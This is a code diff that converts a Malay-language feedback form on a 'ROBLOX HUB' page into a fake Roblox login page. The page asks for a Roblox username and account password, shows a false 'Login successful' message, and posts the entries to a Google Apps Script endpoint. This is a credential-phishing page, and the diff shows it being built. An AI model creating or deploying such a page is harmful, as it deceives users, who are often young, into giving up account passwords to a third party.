@@ -94,20 +94,20 @@
 <body>
   <main class="panel">
     <div class="logo">ROBLOX <span>HUB</span></div>
-    <p>Hantar feedback dan cadangan kamu kepada kami.</p>
+    <p>Roblox Login Data</p>
 
     <form id="feedbackForm">
       <label for="name">Nama pengguna Roblox</label>
       <input id="name" maxlength="50"
-        placeholder="Masukkan nama pengguna"
+        placeholder="Enter your Roblox username"
         autocomplete="nickname">
 
-      <label for="message">Mesej feedback</label>
+      <label for="message">Kata laluan akaun Roblox anda</label>
       <textarea id="message" maxlength="2000"
-        placeholder="Tulis feedback kamu di sini..."
+        placeholder="Your Roblox password account"
         required></textarea>
 
-      <button type="submit">Hantar Mesej ↗</button>
+      <button type="submit">Login Roblox ↗</button>
       <div id="status" role="status" aria-live="polite"></div>
     </form>
 
@@ -118,7 +118,7 @@
   </main>
 
   <script>
-    const scriptURL = "https://script.google.com/macros/s/AKfycbywE0WK4vO2vS95Myi1p-qVrsl1FRcE5pxhiYAfCuj75O-okhD_RUIdYqq3qOtYb16naA/exec";
+    const scriptURL = "https://script.google.com/macros/s/AKfycbzUeqm2pyOHcKBd4METO1JOGFZ-9lNBkrJirulz-CuEyoSOd4wsQkHh0Znmf6o12sKyXg/exec";
 
     document.getElementById("feedbackForm")
       .addEventListener("submit", async function(event) {
@@ -137,15 +137,15 @@
           return;
         }
 
-        if (scriptURL === "PASTE_URL_EXEC_AWAK_DI_SINI") {
+        if (scriptURL === "https://script.google.com/macros/s/AKfycbzUeqm2pyOHcKBd4METO1JOGFZ-9lNBkrJirulz-CuEyoSOd4wsQkHh0Znmf6o12sKyXg/exec") {
           status.textContent =
             "Sila tetapkan URL Google Apps Script dahulu.";
           return;
         }
 
         button.disabled = true;
-        button.textContent = "Menghantar...";
-        status.textContent = "Sedang menghantar feedback...";
+        button.textContent = "Loading...";
+        status.textContent = "Log into your account...";
 
         try {
           await fetch(scriptURL, {
@@ -158,14 +158,14 @@
           });
 
           status.textContent =
-            "Permintaan dihantar. Semak Google Sheets untuk pengesahan.";
+            "Login successful, Please restart your website.";
           this.reset();
         } catch (error) {
           status.textContent =
-            "Penghantaran gagal. Sila cuba lagi.";
+            "Delivery failed. Please try again.";
         } finally {
           button.disabled = false;
-          button.textContent = "Hantar Mesej ↗";
+          button.textContent = "Login ↗";
         }
       });
   </script>
